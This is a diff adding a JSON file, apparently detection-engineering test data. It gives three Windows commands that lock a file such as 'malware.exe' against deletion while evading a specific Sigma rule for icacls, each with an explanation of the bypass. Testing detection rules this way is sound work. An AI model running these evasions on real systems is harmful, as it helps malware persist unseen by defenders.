@@ -1,0 +1,14 @@
+[
+  {
+    "output": "icacls.exe \"C:\\Users\\Public\\malware.exe\" /deny \"Everyone:(OI)(CI)(DE,DC)\"",
+    "explanation": "The original Sigma rule explicitly looks for the SID string '*S-1-1-0:'. By using the friendly name 'Everyone' instead of the SID, the logical outcome is the same (denying access to all users), but the specific string match required by the detection rule is avoided."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\icacls.exe C:\\Users\\Public\\not_icacls.exe && C:\\Users\\Public\\not_icacls.exe \"C:\\Users\\Public\\secret\" /deny *S-1-1-0:(OI)(CI)(DE,DC)",
+    "explanation": "The rule filters by 'OriginalFileName' or 'Image' ending in '\\icacls.exe'. If the environment does not support 'OriginalFileName' (which requires specific Sysmon or Event ID 4688 configurations) and only monitors the file path, renaming the binary bypasses the 'selection_icacls' criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"$acl = Get-Acl 'C:\\Users\\Public\\file.txt'; $sid = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0'); $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($sid, 'Delete,DeleteSubdirectoriesAndFiles', 'ContainerInherit,ObjectInherit', 'None', 'Deny'); $acl.AddAccessRule($rule); Set-Acl 'C:\\Users\\Public\\file.txt' $acl\"",
+    "explanation": "This bypasses the rule entirely by not using the 'icacls.exe' process. It achieves the exact same security descriptor modification using PowerShell's built-in .NET capabilities, which will not trigger a rule looking for icacls command-line arguments."
+  }
+]
